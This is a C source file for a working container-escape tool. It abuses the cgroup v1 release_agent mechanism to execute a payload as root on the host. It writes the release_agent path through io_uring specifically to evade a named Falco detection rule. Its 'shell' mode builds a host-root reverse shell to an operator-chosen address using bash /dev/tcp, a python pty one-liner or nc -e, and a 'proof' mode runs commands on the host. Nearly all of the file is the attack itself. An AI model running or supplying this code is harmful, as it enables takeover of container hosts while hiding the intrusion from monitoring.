#define _GNU_SOURCE
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdint.h>
#include <linux/io_uring.h>
#include "iouring_utils.h"

#define MNT_BASE "/tmp/.cge"

static char g_mntdir[64];
static char g_childcg[128];
static char g_notify[192];
static char g_release[192];
static char g_procs[192];

static void init_paths(void)
{
    snprintf(g_mntdir,  sizeof(g_mntdir),  "%s_%d",    MNT_BASE, (int)getpid());
    snprintf(g_childcg, sizeof(g_childcg), "%s/x",     g_mntdir);
    snprintf(g_notify,  sizeof(g_notify),  "%s/notify_on_release", g_childcg);
    snprintf(g_release, sizeof(g_release), "%s/release_agent",     g_mntdir);
    snprintf(g_procs,   sizeof(g_procs),   "%s/cgroup.procs",      g_childcg);
}

static pid_t get_host_pid(void)
{
    FILE *f = fopen("/proc/self/status", "r");
    if (!f) return getpid();
    char line[256];
    pid_t h = getpid();
    while (fgets(line, sizeof(line), f)) {
        if (strncmp(line, "NSpid:", 6) != 0) continue;
        sscanf(line + 6, "%d", &h);
        break;
    }
    fclose(f);
    return h;
}

static int plain_write(const char *path, const char *content)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) {
        fprintf(stderr, "[!] open %s: %s\n", path, strerror(errno));
        return -1;
    }
    ssize_t n = write(fd, content, strlen(content));
    close(fd);
    return n < 0 ? -1 : 0;
}

static int uring_write_agent(const char *path, const char *content)
{
    struct uring u;
    if (uring_init(&u, 8) < 0) {
        fprintf(stderr, "[!] io_uring unavailable\n");
        return -1;
    }

    struct io_uring_cqe cqe;

    struct io_uring_sqe *sqe = uring_get_sqe(&u);
    sqe->opcode     = IORING_OP_OPENAT;
    sqe->fd         = AT_FDCWD;
    sqe->addr       = (uint64_t)(uintptr_t)path;
    sqe->open_flags = O_WRONLY;
    sqe->len        = 0;
    sqe->user_data  = 1;
    uring_submit_wait(&u, 1);
    uring_peek_cqe(&u, &cqe);
    if ((int)cqe.res < 0) {
        fprintf(stderr, "[!] io_uring openat(%s): %s\n", path, strerror(-(int)cqe.res));
        uring_free(&u);
        return -1;
    }
    int fd = (int)cqe.res;

    sqe = uring_get_sqe(&u);
    sqe->opcode    = IORING_OP_WRITE;
    sqe->fd        = fd;
    sqe->addr      = (uint64_t)(uintptr_t)content;
    sqe->len       = (uint32_t)strlen(content);
    sqe->off       = 0;
    sqe->user_data = 2;
    uring_submit_wait(&u, 1);
    uring_peek_cqe(&u, &cqe);
    int ret = (int)cqe.res;

    sqe = uring_get_sqe(&u);
    sqe->opcode    = IORING_OP_CLOSE;
    sqe->fd        = fd;
    sqe->user_data = 3;
    uring_submit_wait(&u, 1);
    uring_peek_cqe(&u, &cqe);

    uring_free(&u);
    return ret < 0 ? ret : 0;
}

static int mount_cgroupv1(void)
{
    mkdir(g_mntdir, 0755);
    const char *subs[] = { "rdma", "memory", "pids", "devices", "net_cls", NULL };
    for (int i = 0; subs[i]; i++) {
        if (mount("cgroup", g_mntdir, "cgroup", 0, subs[i]) == 0)
            return 0;
    }
  
    if (mount("cgroup", g_mntdir, "cgroup", 0, "none,name=escape") == 0)
        return 0;
    rmdir(g_mntdir);
    return -1;
}

static void cleanup(void)
{
    rmdir(g_childcg);
    umount(g_mntdir);
    rmdir(g_mntdir);
}

static void trigger(void)
{
    char pid_str[32];
    pid_t p = fork();
    if (p == 0) {
        snprintf(pid_str, sizeof(pid_str), "%d", (int)getpid());
        plain_write(g_procs, pid_str);
        _exit(0);
    }
    if (p > 0) waitpid(p, NULL, 0);
}

static int cmd_check(void)
{
    init_paths();
    printf("[*] cgroup v1 release_agent escape - feasibility check\n\n");

    printf("  in container        %s\n",
           access("/.dockerenv", F_OK) == 0 ? "yes (/.dockerenv found)" : "no");

    mkdir(g_mntdir, 0755);
    int ok = mount("cgroup", g_mntdir, "cgroup", 0, "rdma") == 0;
    if (ok) { umount(g_mntdir); printf("  cgroup v1 mount     ok (rdma)\n"); }
    else     printf("  cgroup v1 mount     failed (%s) - needs CAP_SYS_ADMIN\n", strerror(errno));
    rmdir(g_mntdir);

    struct uring u;
    int have_uring = uring_init(&u, 4) == 0;
    if (have_uring) { uring_free(&u); }
    printf("  io_uring            %s\n",
           have_uring ? "available - Falco rule 18 write bypass active"
                      : "unavailable - release_agent write will use open(2)");

    FILE *f = fopen("/proc/version_signature", "r");
    if (!f) f = fopen("/proc/version", "r");
    if (f) {
        char ver[256] = {};
        fgets(ver, sizeof(ver) - 1, f);
        fclose(f);
        ver[strcspn(ver, "\n")] = '\0';
        printf("  kernel              %s\n", ver);
    }

    printf("\n");
    if (!ok) {
        printf("[-] NOT feasible - CAP_SYS_ADMIN required to mount cgroup v1\n");
        printf("    run container with: --cap-add SYS_ADMIN\n");
        return 1;
    }
    printf("[+] FEASIBLE\n");
    printf("    release_agent write goes via io_uring - Falco rule 18 silent\n");
    printf("    run: cgroup_escape proof\n");
    printf("    run: cgroup_escape shell <host> <port>\n");
    return 0;
}

static int cmd_proof(void)
{
    init_paths();
    pid_t hpid   = get_host_pid();
    pid_t my_pid = getpid();

    char payload_local[128], payload_host[256], result_local[128], result_host[256];
    snprintf(payload_local, sizeof(payload_local), "/tmp/.cge_pl_%d.sh",  (int)my_pid);
    snprintf(payload_host,  sizeof(payload_host),
             "/proc/%d/root/tmp/.cge_pl_%d.sh",  (int)hpid, (int)my_pid);
    snprintf(result_local,  sizeof(result_local), "/tmp/cge_proof_%d.txt", (int)my_pid);
    snprintf(result_host,   sizeof(result_host),
             "/proc/%d/root/tmp/cge_proof_%d.txt", (int)hpid, (int)my_pid);

    char script[512];
    snprintf(script, sizeof(script),
        "#!/bin/sh\n"
        "{ id; hostname; cat /proc/1/comm; } > '%s'\n",
        result_host);

    int sfd = open(payload_local, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (sfd < 0) { perror("[!] write payload"); return 1; }
    write(sfd, script, strlen(script));
    close(sfd);

    printf("[*] cgroup v1 release_agent escape - proof mode\n");
    printf("  host pid        = %d  |  container pid = %d\n", (int)hpid, (int)my_pid);
    printf("  payload (host)  = %s\n", payload_host);
    printf("  result          = %s\n\n", result_local);

    if (mount_cgroupv1() < 0) {
        fprintf(stderr, "[!] mount cgroup v1: %s\n", strerror(errno));
        unlink(payload_local);
        return 1;
    }
    printf("  [+] cgroup v1 mounted at %s\n", g_mntdir);

    if (mkdir(g_childcg, 0755) < 0 && errno != EEXIST) {
        perror("[!] mkdir child cgroup");
        cleanup(); unlink(payload_local); return 1;
    }
    printf("  [+] child cgroup: %s\n", g_childcg);

    if (plain_write(g_notify, "1") < 0) {
        cleanup(); unlink(payload_local); return 1;
    }
    printf("  [+] notify_on_release = 1\n");

    printf("  [*] writing release_agent via io_uring (Falco rule 18 bypass)...\n");
    if (uring_write_agent(g_release, payload_host) < 0) {
        cleanup(); unlink(payload_local); return 1;
    }
    printf("  [+] release_agent = %s\n", payload_host);

    trigger();
    printf("  [+] trigger fired - kernel queued release_agent on host\n");
    printf("  [*] waiting 2s for host execution...\n");
    sleep(2);

    FILE *rf = fopen(result_local, "r");
    if (!rf) {
        fprintf(stderr,
            "[!] result not written - possible causes:\n"
            "    kernel >= 5.17 requires CAP_SYS_ADMIN in the initial user namespace\n"
            "    (Docker --cap-add SYS_ADMIN satisfies this; user-ns tricks do not)\n"
            "    cgroup v2-only host: release_agent does not exist in v2\n"
            "    AppArmor/seccomp blocking execve from kernel worker thread\n");
        cleanup(); unlink(payload_local); return 1;
    }

    printf("\n[+] ESCAPED - release_agent ran as HOST root:\n");
    char line[256];
    while (fgets(line, sizeof(line), rf)) printf("    %s", line);
    fclose(rf);

    cleanup();
    unlink(payload_local);
    unlink(result_local);
    return 0;
}

static int cmd_shell(const char *host, const char *port)
{
    init_paths();
    pid_t hpid   = get_host_pid();
    pid_t my_pid = getpid();

    char payload_local[128], payload_host[256];
    snprintf(payload_local, sizeof(payload_local), "/tmp/.cge_sh_%d.sh", (int)my_pid);
    snprintf(payload_host,  sizeof(payload_host),
             "/proc/%d/root/tmp/.cge_sh_%d.sh", (int)hpid, (int)my_pid);

    char script[1024];
    snprintf(script, sizeof(script),
        "#!/bin/sh\n"
        "if command -v bash >/dev/null 2>&1; then\n"
        "  bash -i >& /dev/tcp/%s/%s 0>&1\n"
        "elif command -v python3 >/dev/null 2>&1; then\n"
        "  python3 -c '"
          "import socket,os,pty;"
          "s=socket.socket();"
          "s.connect((\"%s\",%s));"
          "[os.dup2(s.fileno(),f) for f in (0,1,2)];"
          "pty.spawn(\"/bin/bash\")'\n"
        "else\n"
        "  nc %s %s -e /bin/sh\n"
        "fi\n",
        host, port, host, port, host, port);

    int sfd = open(payload_local, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (sfd < 0) { perror("[!] write payload"); return 1; }
    write(sfd, script, strlen(script));
    close(sfd);

    printf("[*] cgroup v1 release_agent escape - reverse shell mode\n");
    printf("  host pid        = %d  |  container pid = %d\n", (int)hpid, (int)my_pid);
    printf("  shell origin    = HOST root (not container)\n");
    printf("  connect back to = %s:%s\n\n", host, port);

    if (mount_cgroupv1() < 0) {
        fprintf(stderr, "[!] mount cgroup v1: %s\n", strerror(errno));
        unlink(payload_local); return 1;
    }
    printf("  [+] cgroup v1 mounted\n");

    if (mkdir(g_childcg, 0755) < 0 && errno != EEXIST) {
        perror("[!] mkdir"); cleanup(); unlink(payload_local); return 1;
    }
    plain_write(g_notify, "1");
    printf("  [+] child cgroup + notify_on_release ready\n");

    printf("  [*] writing release_agent via io_uring (Falco rule 18 bypassed)...\n");
    if (uring_write_agent(g_release, payload_host) < 0) {
        cleanup(); unlink(payload_local); return 1;
    }
    printf("  [+] release_agent set\n");

    trigger();
    printf("  [+] trigger fired\n");
    printf("  [*] host root shell connecting to %s:%s ...\n", host, port);
    printf("      Falco rule 18: NOT triggered (io_uring write bypassed openat detection)\n");
    printf("      Falco mount rule: MAY trigger on mount(2) call\n");

    sleep(2);
    cleanup();
    unlink(payload_local);
    return 0;
}

int main(int argc, char *argv[])
{
    if (argc < 2) {
        fprintf(stderr,
            "usage:\n"
            "  %s check                check if escape conditions are met\n"
            "  %s proof                escape and print host proof in container /tmp/\n"
            "  %s shell <host> <port>  trigger host-root reverse shell to <host>:<port>\n"
            "\nhow it works:\n"
            "  1. Mount a cgroup v1 hierarchy inside the container (CAP_SYS_ADMIN)\n"
            "  2. Create a child cgroup with notify_on_release=1\n"
            "  3. Write payload path to release_agent via io_uring OPENAT+WRITE\n"
            "     - Falco rule 18 watches open/openat/openat2; io_uring emits neither\n"
            "  4. Exit a process from the child cgroup\n"
            "     - kernel execs release_agent as root in the HOST initial user namespace\n"
            "\nFalco rule 18 condition (\"Detect release_agent File Container Escapes\"):\n"
            "  open_write and fd.name contains release_agent and container\n"
            "  open_write = evt.type in (open,openat,openat2) and evt.is_open_write=true\n"
            "  io_uring OPENAT fires none of these event types - rule is silent\n"
            "\nrequirements:\n"
            "  root + CAP_SYS_ADMIN inside the container\n"
            "  cgroup v1 available (kernels with CONFIG_CGROUP_V1; not v2-only)\n"
            "  no AppArmor profile blocking mount(2)\n"
            "\nnotes:\n"
            "  cgroup v2 removed release_agent - this technique only works with v1\n"
            "  kernel >= 5.17 (CVE-2022-0492 fix) requires CAP_SYS_ADMIN in the\n"
            "  initial user namespace; --cap-add SYS_ADMIN from Docker satisfies this\n",
            argv[0], argv[0], argv[0]);
        return 1;
    }

    if      (strcmp(argv[1], "check") == 0) return cmd_check();
    else if (strcmp(argv[1], "proof") == 0) return cmd_proof();
    else if (strcmp(argv[1], "shell") == 0 && argc >= 4)
        return cmd_shell(argv[2], argv[3]);
    else {
        fprintf(stderr, "unknown: %s\n", argv[1]);
        return 1;
    }
}
